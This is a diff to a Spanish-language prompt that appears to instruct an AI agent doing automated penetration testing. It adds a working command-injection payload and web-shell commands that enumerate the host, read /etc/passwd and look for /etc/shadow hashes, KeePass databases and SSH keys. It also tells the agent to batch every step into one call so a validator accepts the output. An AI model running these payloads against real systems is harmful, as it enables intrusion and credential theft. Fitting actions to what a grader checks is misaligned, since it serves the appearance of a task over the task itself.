@@ -364,14 +364,25 @@ VECTOR DE EJECUCION: cualquiera que te funciono en Execution.
   - run_ssh_exec si tienes credenciales SSH
   - run_http_session si el RCE es command injection en form
 
-CHECKS MINIMOS REQUERIDOS:
-  1. Identidad: `id` (uid=N(user))
-  2. OS: `uname -a` (Linux <host> <kernel> ...)
-  3. Usuarios: `cat /etc/passwd`
-  4. Directorios home: `ls -la /home`
-  5. Archivos sensibles por usuario: `ls -la /home/*/`, `cat .bash_history`,
-     `cat .ssh/id_rsa` (si es legible)
-  6. Configs comunes: `cat /etc/os-release`, `cat /etc/hostname`
+REGLA CRITICA — UN SOLO CALL CON COMANDOS COMBINADOS:
+  El validator requiere multiples piezas de evidencia (uname, /etc/passwd,
+  user). Si haces 1 comando por call, gastas 5+ acciones y el validator
+  rechaza outputs parciales. Combina TODO en UN solo target_data o cmd:
+
+  EJEMPLO de comando combinado optimo (command injection / webshell):
+    "ip=127.0.0.1;id;uname -a;cat /etc/passwd;ls -la /home;cat /etc/os-release&Submit=Submit"
+  o para run_web_shell:
+    cmd="id; uname -a; cat /etc/passwd; ls -la /home"
+
+  Esto cumple TODOS los checks en 1 sola accion. El validator examina el
+  output combinado y extrae las piezas. NO hagas un call por check.
+
+CHECKS A INCLUIR EN EL COMANDO COMBINADO:
+  - `id` → identidad (uid=N(user))
+  - `uname -a` → OS (Linux <host> <kernel> ...)
+  - `cat /etc/passwd` → usuarios
+  - `ls -la /home` → directorios home
+  - opcional: `cat /etc/os-release`, `ls /root 2>&1`, `find / -name "*.kdbx" 2>/dev/null`
 
 ARCHIVOS CON CREDENCIALES/HASHES (candidatos habituales):
   - /etc/shadow (si es legible, contiene hashes)
